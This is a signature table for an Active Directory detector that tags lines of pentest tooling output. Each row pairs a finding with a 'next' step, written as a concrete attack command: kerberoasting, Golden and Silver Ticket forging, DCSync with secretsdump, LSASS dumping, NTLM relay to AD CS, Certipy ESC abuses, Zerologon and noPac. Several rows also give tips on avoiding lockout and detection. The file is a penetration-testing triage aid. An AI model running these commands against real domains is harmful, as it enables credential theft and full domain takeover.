# Active Directory attack & enumeration signatures. The `ad` detector strips terminal colours
# off each line of an AD tooling dump - NetExec/CrackMapExec, enum4linux-ng, ldapsearch,
# BloodHound/SharpHound, PowerView, Impacket, Rubeus, Certipy, Responder, the coercion tools -
# tests it against every `pattern` (a case-insensitive Java regex), and reports each hit with a
# plain-English "what it is" and "next: where to take it".
#
# This is the same regex-per-row engine the winPEAS/linPEAS detectors use (silverdetector.detect.
# Signatures), so covering one more tool, technique or CVE is a single new row - no code.
#
# ADD YOUR OWN: append a row. `pattern` is a Java regex (already case-insensitive), tabs separate
# columns, `category` only groups the output, and `next` is the exploitation pointer. Write the
# pattern to match the line that means the finding is TRUE (e.g. "signing:False", "(Pwn3d!)",
# "Vulnerable to ESC1"), not the line that merely checks for it.
#
# id                pattern    severity  category  title  meaning  next
id	pattern	severity	category	title	meaning	next
ldap_anon_bind	(anonymous bind|anonymous ldap|allowAnonymousBind.*TRUE|bind.*empty (password|credentials))	WARN	Enum	Anonymous LDAP bind allowed	The directory answers unauthenticated LDAP queries, dumping users, computers and their attributes to anyone on the network.	ldapsearch -x -H ldap://<dc> -b "DC=corp,DC=local" "(objectClass=user)"
rid_cycling	(RID cycl|querydispinfo|enumdomusers|lookupsids|Found user|Trying to (get|dump) SIDs)	NOTICE	Enum	Domain users enumerable (RID/SID)	Account names were recovered by walking RIDs / SIDs - the raw material for password spraying, AS-REP roasting and kerberoasting.	build a user list; feed it to kerbrute or a spray
maq	(ms-DS-MachineAccountQuota|MachineAccountQuota)\D{0,20}([1-9]|[1-9][0-9])	WARN	Enum	MachineAccountQuota lets you add computers	The domain's default lets any user create computer accounts. A machine account you control is the pivot for RBCD and several ADCS/Kerberos abuses.	addcomputer.py -computer-name evil$ -computer-pass P@ss dom/user:pass ; then RBCD or S4U
weak_pass_policy	(Minimum password length:\s*[0-7]\b|Password Complexity.*(Disabled|0)|Domain Password Complex.*0)	WARN	Enum	Weak domain password policy	Short or non-complex passwords are permitted, so a spray with a season/company guess is likely to land.	spray a common password across the enumerated users (watch the lockout policy first)
lockout_enforced	(Account Lockout Threshold:\s*[1-9]|Lockout threshold:\s*[1-9]|lockoutThreshold.*[1-9])	NOTICE	Enum	Account lockout is enforced	Passwords lock out after a few tries - spray slowly (one guess per account per window) or you will lock the domain and get caught.	one attempt per account, then wait the observation window; prefer Kerberos (kerbrute) spraying
naming_context	(defaultNamingContext|rootDomainNamingContext|namingContexts:)	INFO	Enum	LDAP naming context / domain DN	The base DN and forest root - what to pass as the LDAP search base and a confirmation of the domain/forest name.	use it as -b "DC=corp,DC=local" in your LDAP queries
# ---- credentials -----------------------------------------------------------------------------
valid_creds	\[\+\]\s+[^\\\s]+\\[^:\s]+:\S	CRITICAL	Creds	Valid domain credentials confirmed	A username/password (or hash) authenticated. Domain creds unlock LDAP/BloodHound as a user, share access, and spraying the pair everywhere else.	nxc smb <targets> -u user -p pass ; collect BloodHound as this user
pwned_admin	(\(Pwn3d!\)|Administrator access|admin access|is admin on)	CRITICAL	Creds	Local admin / Pwn3d! on a host	The account is a local administrator here - full control of the box: dump SAM/LSASS, run code, and move on.	nxc smb <host> -u u -p p --sam --lsa ; or psexec.py / evil-winrm for a shell
gpp_password	(cpassword|Groups\.xml|Get-GPPPassword|gpp-decrypt)	CRITICAL	Creds	GPP cpassword in SYSVOL	Group Policy Preferences stored a password AES-encrypted with a key Microsoft published, so it is trivially reversible - and readable by any domain user in SYSVOL.	gpp-decrypt <cpassword> ; or Get-GPPPassword remotely
laps_readable	(ms-Mcs-AdmPwd\b|ms-LAPS-Password|ReadLAPSPassword|LAPS.*(readable|password:))	WARN	Creds	LAPS local-admin password readable	You can read the randomised local administrator password of a machine via LAPS - a direct local admin credential for that host.	nxc ldap <dc> -u u -p p -M laps ; or read ms-Mcs-AdmPwd over LDAP
cred_in_attr	(userPassword|unixUserPassword|unicodePwd|Description:.*(pass|pwd|:\s*\S{6,}))	NOTICE	Creds	Password in a directory attribute	A user/computer attribute (often Description) holds what looks like a password - a classic place admins stash them.	read the attribute and try the credential across the domain
spray_hit	(password spray|spraying).*(\[\+\]|VALID|SUCCESS|found)	CRITICAL	Creds	Password spray landed	A sprayed password matched at least one account - valid domain credentials with no cracking needed.	confirm with nxc; collect BloodHound as the account
status_must_change	STATUS_PASSWORD_MUST_CHANGE	NOTICE	Creds	Valid creds, password expired	The password is correct but must be changed at next logon - still valid, and you can reset it yourself over SMB/RPC.	smbpasswd -r <dc> -U user ; or rpcclient setuserinfo2
status_locked	STATUS_ACCOUNT_LOCKED_OUT	WARN	Creds	Account lockout hit - stop spraying	You have tripped the lockout policy. Keep going and you lock accounts, generate alerts, and lose the spray.	stop; wait the reset window; slow down to one guess per account per window
# ---- Kerberos --------------------------------------------------------------------------------
kerberoast	(GetUserSPNs|Invoke-Kerberoast|Rubeus\.?e?x?e?\s+kerberoast|targetedKerberoast|kerberoast)	CRITICAL	Kerberos	Kerberoasting	Any domain user can request a service ticket for an account that has an SPN; the ticket is encrypted with that account's password hash and cracks offline with no lockout.	GetUserSPNs.py dom/user:pass -request ; crack the $krb5tgs$ with hashcat -m 13100
asreproast	(GetNPUsers|Rubeus\.?e?x?e?\s+asrep|asreproast|AS-?REP roast|DONT_REQ_PREAUTH|Do not require (Kerberos )?pre-?auth)	CRITICAL	Kerberos	AS-REP roasting	An account has "do not require Kerberos pre-authentication" set, so its AS-REP can be requested with no credentials and cracked offline to the password.	GetNPUsers.py dom/ -usersfile users.txt -no-pass -request ; crack $krb5asrep$ with hashcat -m 18200
spn_account	(servicePrincipalName|MSSQLSvc/|CIFS/[A-Za-z0-9._-]|\bSPN(s)?\b\s*[:=].*/)	WARN	Kerberos	Service account with an SPN (kerberoastable)	The account has a Service Principal Name, so it is a kerberoasting target - request its ticket and crack it offline.	GetUserSPNs.py -request ; the resulting $krb5tgs$ goes to hashcat -m 13100
overpass_hash	(overpass-the-hash|over-?pass-?the-?hash|Rubeus\.?e?x?e?\s+asktgt|getTGT\.py)	WARN	Kerberos	Overpass-the-hash / request a TGT	An NT hash (or AES key) is being turned into a full Kerberos TGT, upgrading a hash into ticket-based access to Kerberos-only services.	getTGT.py dom/user -hashes :<NT> ; export KRB5CCNAME then use -k -no-pass
pass_the_ticket	(pass-the-ticket|\.ccache\b|\.kirbi\b|KRB5CCNAME|ticketConverter|Rubeus\.?e?x?e?\s+ptt)	WARN	Kerberos	Pass-the-ticket	A Kerberos ticket (.ccache/.kirbi) is being injected and reused, authenticating as its owner with no password.	export KRB5CCNAME=ticket.ccache ; psexec.py -k -no-pass dom/user@host
golden_ticket	(golden ticket|\bkrbtgt\b|Rubeus\.?e?x?e?\s+golden|ticketer\.py|dcsync.*krbtgt)	CRITICAL	Kerberos	Golden Ticket material (krbtgt)	The krbtgt account's hash signs every TGT in the domain. With it you forge tickets for any user - domain-wide, long-lived, hard to revoke persistence.	ticketer.py -nthash <krbtgt> -domain-sid <sid> -domain dom Administrator
silver_ticket	(silver ticket|ticketer\.py.*-spn|Rubeus\.?e?x?e?\s+silver)	CRITICAL	Kerberos	Silver Ticket	A service account's hash forges a service ticket directly to one service (CIFS/HOST/HTTP...), bypassing the DC and much logging.	ticketer.py -nthash <svc> -domain-sid <sid> -spn cifs/host dom user
ms14068	(MS14-068|ms14-068|goldenPac|PAC.*(forg|checksum))	CRITICAL	Kerberos	MS14-068 PAC forgery	On an unpatched DC, a normal user forges a PAC claiming Domain Admin membership - instant domain compromise.	goldenPac.py dom/user:pass@dc  (confirm the DC is unpatched first)
# ---- delegation ------------------------------------------------------------------------------
unconstrained_deleg	(unconstrained delegation|TRUSTED_FOR_DELEGATION|ADS_UF_TRUSTED_FOR_DELEGATION)	CRITICAL	Delegation	Unconstrained delegation	A computer (not the DC) can impersonate any user who authenticates to it. Coerce a DC to authenticate, capture its TGT, and DCSync.	monitor with Rubeus; coerce the DC (PetitPotam/PrinterBug) then extract and reuse its TGT
constrained_deleg	((?<!resource.based.)constrained delegation|msDS-AllowedToDelegateTo|TRUSTED_TO_AUTH_FOR_DELEGATION|S4U2(self|proxy))	CRITICAL	Delegation	Constrained delegation (S4U)	The account can request tickets to specific services on behalf of any user (including Domain Admins) via S4U2Self+S4U2Proxy.	getST.py -spn <target-spn> -impersonate Administrator dom/svc -hashes :<NT>
rbcd	(resource-based constrained|msDS-AllowedToActOnBehalfOfOtherIdentity|AllowedToAct|\brbcd\b)	CRITICAL	Delegation	Resource-based constrained delegation (RBCD)	If you can write msDS-AllowedToActOnBehalfOfOtherIdentity on a target, a computer account you control can impersonate anyone to it - a common path to local SYSTEM.	rbcd.py -delegate-to target$ -delegate-from evil$ -action write dom/user ; then getST -impersonate Administrator
# ---- ACL abuse (BloodHound edges) ------------------------------------------------------------
acl_genericall	\bGenericAll\b	CRITICAL	ACL	GenericAll over an object	Full control of the target object. Over a user: reset its password or add Shadow Credentials. Over a group: add yourself. Over a computer: RBCD.	depending on target: reset password / add to group / set RBCD / AddKeyCredentialLink
acl_genericwrite	\bGenericWrite\b	CRITICAL	ACL	GenericWrite over an object	Write any non-protected attribute of the target - enough for a targeted kerberoast (set an SPN), Shadow Credentials, or a logon-script swap.	set servicePrincipalName then kerberoast; or add msDS-KeyCredentialLink (Whisker/pywhisker)
acl_writedacl	\bWriteDacl\b	CRITICAL	ACL	WriteDacl over an object	You can rewrite the object's ACL, granting yourself full control - and, on the domain object, DCSync rights.	dacledit.py to grant yourself GenericAll / DS-Replication rights, then abuse them
acl_writeowner	\bWriteOwner\b	CRITICAL	ACL	WriteOwner over an object	Make yourself the owner, then grant yourself full control - a two-step route to GenericAll on the target.	owneredit.py -action write -new-owner you -target target$ ; then dacledit
acl_forcechange	ForceChangePassword	CRITICAL	ACL	ForceChangePassword over a user	Reset the target user's password without knowing the old one - a direct account takeover.	net rpc password <user> -U dom/you ; or Set-DomainUserPassword (PowerView)
acl_addmember	(AddMember\b|AddSelf\b)	WARN	ACL	AddMember / AddSelf on a group	You can add members to the group. If it is privileged (Domain Admins, a nested admin group), add yourself and inherit its rights.	net rpc group addmem "Group" you -U dom/you ; or Add-DomainGroupMember
acl_shadowcred	(AddKeyCredentialLink|Shadow Credential|msDS-KeyCredentialLink|Whisker|pywhisker)	CRITICAL	ACL	Shadow Credentials (AddKeyCredentialLink)	Writing msDS-KeyCredentialLink adds an attacker-controlled certificate to the target, letting you PKINIT-authenticate as it and recover its NT hash - no password reset needed, so it is quiet.	pywhisker -a add ... ; then certipy/gettgtpkinit auth as the target
acl_dcsync	(DCSync|GetChangesAll|GetChanges\b|DS-Replication-Get-Changes|Replicating Directory Changes|drsuapi)	CRITICAL	ACL	DCSync rights	The principal can replicate directory secrets, i.e. pull every account's hash (including krbtgt) straight from the DC as if it were another DC.	secretsdump.py -just-dc dom/user@dc ; or lsadump::dcsync /all
acl_remote_right	(CanPSRemote|CanRDP|ExecuteDCOM|SQLAdmin\b)	WARN	ACL	Remote-execution right on a host	A BloodHound edge granting an interactive foothold: CanPSRemote (WinRM), CanRDP (Remote Desktop), ExecuteDCOM, or SQLAdmin. Combine with local-admin or a service to run code.	CanPSRemote: evil-winrm ; CanRDP: xfreerdp ; ExecuteDCOM: dcomexec.py ; SQLAdmin: mssqlclient.py
admincount	(adminCount\s*[:=]\s*1|AdminCount:\s*True)	NOTICE	ACL	adminCount=1 (protected object)	The object is (or was) a member of a protected privileged group; AdminSDHolder re-stamps its ACL. A high-value target worth focusing on.	prioritise this account/group; check what privileged group it belongs to
# ---- AD CS (ESC1-ESC13) ----------------------------------------------------------------------
adcs_esc1	(\bESC1\b|ENROLLEE_SUPPLIES_SUBJECT)	CRITICAL	ADCS	ESC1 - enrollee supplies the subject	A template lets a low-priv user enrol and set an arbitrary subject/UPN with a client-auth EKU, so you request a cert AS a Domain Admin and authenticate as them.	certipy req -u user@dom -p pass -ca <CA> -template <t> -upn administrator@dom ; certipy auth -pfx administrator.pfx
adcs_esc2	(\bESC2\b|Any Purpose EKU|Any Purpose\b)	CRITICAL	ADCS	ESC2 - Any Purpose / SubCA template	The template's EKU is Any Purpose (or no EKU / SubCA), so an issued cert can be used to authenticate as anyone, ESC1-style.	certipy req ... then use the cert for PKINIT as a privileged user
adcs_esc3	(\bESC3\b|Certificate Request Agent|Enrollment Agent)	CRITICAL	ADCS	ESC3 - enrollment agent certificate	An enrollment-agent cert lets you request certs on behalf of other users, so you enrol as a Domain Admin.	certipy req -template <agent> ; then -on-behalf-of dom\\administrator
adcs_esc4	(\bESC4\b|template.*(WriteDacl|WriteOwner|GenericAll|FullControl))	CRITICAL	ADCS	ESC4 - template ACL is writable	You can edit the certificate template's ACL. Reconfigure it into an ESC1 (enrollee supplies subject + client auth) and enrol as an admin.	certipy template -template <t> -write ... to make it vulnerable, then ESC1
adcs_esc6	(\bESC6\b|EDITF_ATTRIBUTESUBJECTALTNAME2)	CRITICAL	ADCS	ESC6 - CA honours attacker SAN	The CA flag EDITF_ATTRIBUTESUBJECTALTNAME2 lets any request specify an arbitrary SAN, so any enrollable template becomes an ESC1.	certipy req -template User -upn administrator@dom (CA applies your SAN)
adcs_esc7	(\bESC7\b|ManageCA|Manage CA|ManageCertificates)	CRITICAL	ADCS	ESC7 - CA management rights	You hold ManageCA/ManageCertificates on the CA - enable the SAN flag (ESC6), approve your own requests, or add a template.	certipy ca -enable-template ... / -issue-request ; then request a client-auth cert
adcs_esc8	(\bESC8\b|NTLM relay to.*(ADCS|AD CS|web enrollment)|/certsrv/|certfnsh\.asp)	CRITICAL	ADCS	ESC8 - NTLM relay to AD CS web enrollment	The CA's HTTP enrollment endpoint accepts NTLM, so coerce a machine (PetitPotam) and relay its auth to get a cert for that machine account - then DCSync via the DC's cert.	ntlmrelayx.py -t http://<ca>/certsrv/certfnsh.asp -smb2support --adcs ; then PetitPotam the DC
adcs_esc9	(\bESC9\b|no security extension|szOID_NTDS_CA_SECURITY_EXT)	CRITICAL	ADCS	ESC9 - no security extension	The template omits the SID security extension, so combined with a mapped altname it enables cert-based impersonation of another account.	certipy with -upn of the victim (chain with GenericWrite over the source user)
adcs_esc10	(\bESC10\b|CertificateMappingMethods|StrongCertificateBindingEnforcement)	CRITICAL	ADCS	ESC10 - weak certificate mapping	Weak cert-to-account mapping on the DC lets a cert with a spoofed UPN/altname authenticate as another user.	set the victim's UPN / altname and PKINIT as them
adcs_esc11	(\bESC11\b|IF_ENFORCEENCRYPTICERTREQUEST|relay.*ICPR)	CRITICAL	ADCS	ESC11 - relay to the RPC enrollment (ICPR)	The CA's RPC certificate interface accepts unencrypted requests, so NTLM can be relayed to it (the RPC analogue of ESC8).	ntlmrelayx with the ICPR/-rpc target ; coerce a machine to authenticate
adcs_esc13	(\bESC13\b|issuance policy.*group|OID.*group link)	CRITICAL	ADCS	ESC13 - issuance policy linked to a group	A template's issuance policy OID is linked to a privileged group, so enrolling yields a token with that group's rights.	certipy req the template; the issued cert grants the linked group's access
adcs_vuln_generic	(\[!\].*[Vv]ulnerable|is vulnerable to ESC|Vulnerabilities\s*:)	CRITICAL	ADCS	AD CS template flagged vulnerable	Certipy marked a template or CA as vulnerable to a certificate-abuse technique (the ESC family). Read which ESC and follow it.	read the ESC number in the finding; certipy req/auth per that technique
# ---- coercion & relay ------------------------------------------------------------------------
petitpotam	(PetitPotam|MS-EFSR|EfsRpcOpenFileRaw|EfsRpcEncryptFileSrv)	CRITICAL	Coercion	PetitPotam coercion (MS-EFSRPC)	Forces a target (often a DC) to authenticate to you over MS-EFSRPC with no credentials - the classic front half of an ADCS ESC8 relay to full domain compromise.	PetitPotam.py <relay-listener> <dc> while ntlmrelayx --adcs relays to the CA
printerbug	(PrinterBug|SpoolSample|MS-RPRN|RpcRemoteFindFirstPrinterChangeNotification|spoolss)	CRITICAL	Coercion	PrinterBug / spooler coercion (MS-RPRN)	The Print System Remote Protocol coerces a host with the Spooler running to authenticate to you - feeds unconstrained-delegation and relay attacks.	dementor.py / printerbug.py <target> <listener> ; capture or relay the auth
dfscoerce	(DFSCoerce|MS-DFSNM|NetrDfsAddStdRoot)	CRITICAL	Coercion	DFSCoerce (MS-DFSNM)	Coerces authentication over the DFS namespace protocol - another Spooler-independent trigger for relay/delegation attacks.	DFSCoerce.py -u user -p pass <listener> <dc>
shadowcoerce	(ShadowCoerce|MS-FSRVP)	WARN	Coercion	ShadowCoerce (MS-FSRVP)	Coerces authentication via the File Server VSS Agent protocol - yet another coercion trigger when the Spooler is disabled.	ShadowCoerce PoC <listener> <target>
ntlmrelay	(ntlmrelayx|SMB relay|Relaying|relay to (smb|ldap|http))	WARN	Relay	NTLM relay in progress	Captured authentication is being relayed to another host. Against LDAP it can grant RBCD/Shadow-Cred rights; against ADCS a cert; against SMB a shell - wherever signing is not enforced.	ntlmrelayx.py -tf targets.txt -smb2support (add --delegate-access / --adcs as needed)
responder_capture	(\[SMB\] NTLMv2|\[HTTP\] NTLMv2|NTLMv2-SSP Hash|LLMNR|NBT-NS|MDNS.*Poisoned|Responder)	WARN	Relay	Responder poisoning captured a NetNTLM hash	LLMNR/NBT-NS/mDNS poisoning answered a name lookup and captured a NetNTLMv2 response. Crack it offline, or relay it live if SMB signing is not required.	crack: hashcat -m 5600 ; or relay: ntlmrelayx to a signing-off host (relaying beats cracking)
mitm6	(\bmitm6\b|DHCPv6|WPAD.*(IPv6|proxy)|IPv6.*takeover)	WARN	Relay	mitm6 (IPv6 DNS takeover)	Rogue DHCPv6 makes you the network's IPv6 DNS server, so Windows clients hand you their authentication (WPAD) - pair with ntlmrelayx to LDAP for RBCD.	mitm6 -d dom.local + ntlmrelayx.py -6 -t ldaps://<dc> --delegate-access
webdav_coerce	(WebClient|WebDAV|@SSL\\|DavWWWRoot)	NOTICE	Relay	WebClient/WebDAV present (HTTP coercion)	A host with the WebClient service running can be coerced over HTTP, which relays to ADCS/LDAP even when SMB signing is on.	check WebDAV status (nxc -M webdav); coerce over HTTP to relay to the CA
# ---- high-impact CVEs ------------------------------------------------------------------------
zerologon	(Zerologon|CVE-2020-1472|Netlogon.*(vulnerable|zero|reset the))	CRITICAL	CVE	Zerologon (CVE-2020-1472)	A Netlogon crypto flaw lets an unauthenticated attacker set the DC's machine-account password to empty, then DCSync the domain. Instant, unauthenticated domain takeover on unpatched DCs.	zerologon PoC to test, then secretsdump -just-dc (RESTORE the DC's password after - it breaks the DC)
nopac	(noPac|sam.?the.?admin|CVE-2021-42278|CVE-2021-42287|sAMAccountName spoof)	CRITICAL	CVE	noPac / sAMAccountName spoofing	Combining CVE-2021-42278 and -42287, a user with MachineAccountQuota renames a computer to a DC's name to obtain a Domain-Admin service ticket.	noPac.py -dc-ip <dc> dom/user:pass -impersonate administrator -use-ldap
printnightmare	(PrintNightmare|CVE-2021-34527|CVE-2021-1675)	CRITICAL	CVE	PrintNightmare (CVE-2021-34527)	A Print Spooler flaw runs an attacker DLL as SYSTEM - local privesc, and remote code execution against a DC still running the Spooler.	CVE-2021-1675 PoC pointing at a malicious DLL on a share
# ---- credential dumping ----------------------------------------------------------------------
ntds_dump	(secretsdump|-just-dc\b|NTDS\.dit|Dumping Domain Credentials|-just-dc-ntlm)	CRITICAL	Dumping	Domain credential dump (NTDS / secretsdump)	The domain's hash database is being pulled - every account's NT hash, including krbtgt. This is game over: pass-the-hash anywhere, forge Golden Tickets, or crack offline.	secretsdump.py -just-dc dom/user@dc ; the krbtgt hash forges Golden Tickets
lsass_dump	(sekurlsa::logonpasswords|lsass\.dmp|procdump.*lsass|comsvcs.*MiniDump|nanodump|lsassy|handlekatz)	CRITICAL	Dumping	LSASS memory dump	LSASS holds the hashes and sometimes cleartext of everyone logged on to this host - dumping it yields credentials for lateral movement, often to more privileged accounts.	mimikatz sekurlsa::logonpasswords ; or nxc -M lsassy / --lsa
dcc_cached	(mscash|\$DCC2\$|cached (domain )?(logon|cred))	WARN	Dumping	Cached domain credentials (DCC2)	The host cached domain logons so users can sign in offline. These verifiers cannot be passed - only cracked (hashcat -m 2100) - but a cracked one is a real password.	nxc smb <host> --lsa ; crack the $DCC2$ with hashcat -m 2100
# ---- lateral movement & trusts ---------------------------------------------------------------
remote_exec	(psexec\.py|smbexec\.py|wmiexec\.py|atexec\.py|dcomexec\.py|PsExec(\.exe|64)?\b)	WARN	Lateral	SMB/WMI remote execution	Command execution on a remote host over SMB/WMI/DCOM using admin credentials or a hash - the standard lateral-movement step.	wmiexec.py dom/user@host (quieter than psexec) ; or -hashes for pass-the-hash
winrm_exec	(evil-winrm|\bwinrs\b|Enter-PSSession|New-PSSession|WinRM.*(open|enabled))	NOTICE	Lateral	WinRM remote shell	PowerShell Remoting / WinRM (5985/5986) is a clean interactive shell for accounts in Remote Management Users or local admins.	evil-winrm -i <host> -u user -p pass  (or -H <NT> for pass-the-hash)
pass_the_hash	(pass-the-hash|pass the hash|-hashes\s+[0-9a-fA-F]{32}:[0-9a-fA-F]{32}|--pw-nt-hash|\bPtH\b)	WARN	Lateral	Pass-the-hash	An NT hash is being used to authenticate directly, with no password and no cracking - it works anywhere the account is a local admin.	nxc smb <targets> -u user -H <NT> ; psexec.py -hashes :<NT>
domain_trust	(nltest.*trust|Get-DomainTrust|trustDirection|Domain Trusts|trustAttributes|Get-ADTrust)	NOTICE	Trusts	Domain / forest trust	A trust to another domain or forest widens the attack surface - foreign group memberships, and with a trust key, inter-realm ticket forging.	Get-DomainTrust / nltest /domain_trusts ; enumerate foreign privileged access
sid_history	(sidHistory|SID History|--sid-history|ExtraSids|extraSids)	WARN	Trusts	SID history / ExtraSids abuse	SID history lets a principal carry another domain's privileged SID. In a forged inter-realm ticket, an Enterprise Admin SID crosses the trust.	ticketer.py ... -extra-sid <EnterpriseAdmins-SID> for cross-trust escalation
